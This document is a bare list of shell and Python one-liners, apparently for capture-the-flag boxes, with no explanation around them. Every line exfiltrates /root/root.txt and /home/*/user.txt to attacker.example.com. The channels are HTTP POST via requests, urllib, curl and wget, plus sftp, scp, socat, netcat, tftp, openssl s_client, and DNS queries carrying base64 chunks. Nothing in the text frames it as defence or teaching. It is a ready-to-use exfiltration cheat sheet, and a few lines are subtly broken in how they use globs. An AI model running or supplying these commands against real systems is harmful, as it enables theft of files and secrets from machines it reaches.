python3 - <<'PY'
import requests
files=[('file',('root.txt',open('/root/root.txt','rb')))]
import glob
for f in glob.glob('/home/*/user.txt'):
    files.append(('file',(f.split('/')[-2]+'_user.txt',open(f,'rb'))))
requests.post('http://attacker.example.com/upload', files=files)
PY

sftp -o StrictHostKeyChecking=no attacker.example.com <<'EOF'
put /root/root.txt /tmp/root.txt
put /home/*/user.txt /tmp/user.txt
EOF

python3 - <<'PY'
import urllib.request,glob
for f in glob.glob('/root/root.txt')+glob.glob('/home/*/user.txt'):
    with open(f,'rb') as fh:
        data=fh.read()
    req=urllib.request.Request('http://attacker.example.com/upload',data=data,method='POST')
    urllib.request.urlopen(req,timeout=10)
PY
for f in /root/root.txt /home/*/user.txt; do b=$(base64 -w0 "$f"); for i in $(echo "$b" | fold -w50); do nslookup "$i.attacker.example.com" >/dev/null 2>&1; done; done
curl -sS -X POST -F "file=@/root/root.txt" http://attacker.example.com/upload && curl -sS -X POST -F "file=@/home/*/user.txt" http://attacker.example.com/upload
for f in /root/root.txt /home/*/user.txt; do cat "$f" | openssl s_client -quiet -connect attacker.example.com:443; done
socat -u FILE:/root/root.txt TCP:attacker.example.com:4444 && socat -u FILE:/home/*/user.txt TCP:attacker.example.com:4444
for f in /root/root.txt /home/*/user.txt; do wget -qO- --post-file="$f" http://attacker.example.com/upload; done
nc -w 5 attacker.example.com 5555 < /root/root.txt && for f in /home/*/user.txt; do nc -w 5 attacker.example.com 5555 < "$f"; done
for f in /root/root.txt /home/*/user.txt; do tftp attacker.example.com -c put "$f"; done
for f in /root/root.txt /home/*/user.txt; do openssl s_client -quiet -connect attacker.example.com:4444 < "$f"; done
for f in /root/root.txt /home/*/user.txt; do scp -q "$f" attacker.example.com:/tmp/; done

python3 - <<'PY'
import glob,urllib.request,os
files=['/root/root.txt']+glob.glob('/home/*/user.txt')
for f in files:
    if os.path.isfile(f):
        with open(f,'rb') as fh:
            data=fh.read()
        req=urllib.request.Request('http://attacker.example.com/upload?name='+os.path.basename(f),data=data,method='POST')
        urllib.request.urlopen(req,timeout=10).read()
PY
